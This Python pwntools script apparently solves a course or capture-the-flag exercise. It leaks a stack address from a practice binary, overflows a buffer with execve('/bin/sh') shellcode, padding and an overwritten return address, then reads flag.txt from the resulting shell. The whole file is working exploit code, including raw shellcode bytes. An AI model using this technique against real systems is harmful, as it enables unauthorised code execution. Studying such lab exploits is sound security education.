#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./shellter_your_code", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def main():
    io = start()
    
    leak = io.recvuntil(b"!\n").split(b" ")[1]      #extract the leak from "Hello <leaked infos>"
    print(leak)
    leak = int(leak[0:-2],16)
    print(leak)
       
    until_ret_addr = 0x44                           #in welcomeMe are two arrays with total length 68=0x44
    ret_addr = p32(leak - 0x68)                     #the return address is placed 0x68 bytes before leak. We convert it to little endian
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" 
    # shellcode is from here: http://shell-storm.org/shellcode/files/shellcode-811.php thanks for the hint in the lecture ;P

    junk = (until_ret_addr - len(shellcode)) * b"A" #create some junk which gives us enough space for the shellcode
    input = shellcode + junk + ret_addr             #now we have to define the input which consists of a concatenation of our shellcode, junk and the new return address where our shellcode is located
    
    unimportant = io.recvuntil(b"Please enter your name: ") #we catch some unimportant things
    io.sendline(input)                              #we enter our input as soon as the binary expects input
    unimportant = io.recvline()                     #we catch some more unimportant things
    io.sendline(b"cat flag.txt")                    #in the started shell, we execute cat flag.txt
    print(io.recv().decode('utf-8')[:-1])           #get rid of this newline     

if __name__ == "__main__":
    main()
